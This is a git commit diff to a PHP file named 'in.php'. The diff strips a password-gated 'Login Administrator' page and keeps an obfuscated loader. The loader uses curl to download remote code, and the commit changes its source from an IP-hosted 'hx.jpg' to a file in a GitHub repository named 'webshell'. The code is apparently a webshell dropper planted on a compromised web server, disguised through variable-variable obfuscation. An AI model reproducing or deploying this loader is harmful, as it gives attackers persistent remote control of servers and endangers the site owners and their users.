4ed6c60d4d4d24a87752fe882088181b568d250e
dandi889 <138586931+dandi889@users.noreply.github.com>
2024-08-24 00:01:23 +0700

    Update in.php
    Signed-off-by: dandi889 <138586931+dandi889@users.noreply.github.com>

--- in.php
+++ in.php
@@ -1,36 +1,3 @@
-<?php
-$password = '1a4cc0e6e36eab9a42731e334e60480f';
-error_reporting(0);
-set_time_limit(0);
-
-session_start();
-if (!isset($_SESSION['loggedIn'])) {
-    $_SESSION['loggedIn'] = false;
-}
-
-if (isset($_POST['password'])) {
-    if (md5($_POST['password']) == $password) {
-        $_SESSION['loggedIn'] = true;
-    }
-} 
-
-if (!$_SESSION['loggedIn']): ?>
-
-<html><head><title>Login Administrator</title></head>
-  <body bgcolor="black">
-    <center>
-    <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
-    <form method="post">
-      <input type="password" name="password">
-      <input type="submit" name="submit" value="  Login"><br>
-    </form>
-  </body>
-</html>
-
-<?php
-exit();
-endif;
-?>
 <?php 
 ${"GLOBALS"}["delves"]="love";
 ${"GLOBALS"}["0xfah"]="you";
@@ -42,7 +9,7 @@ ${${"GLOBALS"}["haxor"]}=curl_init();
 ${"GLOBALS"}["world"]="love";
 ${"GLOBALS"}["Thxngfa"]="love";
 curl_setopt(${${"GLOBALS"}["i"]},
-CURLOPT_URL,"http://156.67.221.29/hx.jpg");
+CURLOPT_URL,"https://raw.githubusercontent.com/dorzkim/webshell/main/tesla2.php");
 curl_setopt(${${"GLOBALS"}["world"]},CURLOPT_RETURNTRANSFER,1);
 ${${"GLOBALS"}["0xfah"]}=curl_exec(${${"GLOBALS"}["delves"]});
 curl_close(${${"GLOBALS"}["Thxngfa"]});
